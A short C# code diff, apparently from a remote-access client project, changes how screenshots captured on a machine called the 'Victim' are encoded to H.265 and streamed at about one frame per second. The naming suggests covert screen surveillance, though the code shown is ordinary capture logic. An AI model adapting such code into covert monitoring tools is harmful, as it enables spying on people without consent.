@@ -136,10 +136,13 @@ namespace ExtremLink_Client.Pages
                     var screen = CaptureScreen();
                     if (screen != null)
                     {
-                        Victim.VictimInstance.SendFrame(screen);
+                        string framePngFileName = Victim.VictimInstance.CreatePngFile(screen);
+                        string frameH265FileName = Victim.VictimInstance.ConvertPngToH265(framePngFileName);
+                        byte[] frameH265ByteArr = Victim.VictimInstance.ConvertH265ToByteArray(frameH265FileName);
+                        Victim.VictimInstance.SendFrame(frameH265ByteArr);
                     }
                     // Around 1 FPS
-                    // Note: try to use Task.delay intead.
+                    // Note: try to use Task.delay instead.
                     Thread.Sleep(1000);
                 }
                 catch (Exception ex)
@@ -158,8 +161,8 @@ namespace ExtremLink_Client.Pages
                 {
                     var screen = CaptureScreen();
                     Dispatcher.Invoke(() => frameImg.Source = screen);
-                    // Around 60 FPS
-                    Thread.Sleep(16);
+                    // Around 30 FPS
+                    Thread.Sleep(32);
                 }
                 catch (Exception ex)
                 {
